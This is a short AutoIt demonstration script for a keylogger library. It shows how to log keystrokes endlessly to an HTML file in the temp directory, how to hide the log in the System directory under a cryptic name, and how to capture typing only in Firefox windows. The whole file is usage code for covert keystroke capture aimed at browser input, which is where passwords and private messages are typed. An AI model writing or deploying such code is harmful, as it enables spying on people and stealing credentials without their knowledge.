; This Script demonstrates how the keylogger can be used
#include <Keylogger.au3> ; Including the Keylogger

; Creates a File called "keylog-output.html" in the users temporary directory. Logs endlessly
_initWithFilename(@TempDir, "keylog-output")
_run() ; After "_run()" is executed the programm is stuck in a loop

; Creates a File with a rather cryptic name in the useres System directory
_init(@SystemDir)
_run()

; Logs only when the user types in a window with "Firefox" in the title
_initWithFilename(@TempDir, "keylog-output")
_logWindow("Firefox")

; With the _read()-function you can make your own conditional loops
While 1
  If <CONDITION> Then _read()
WEnd
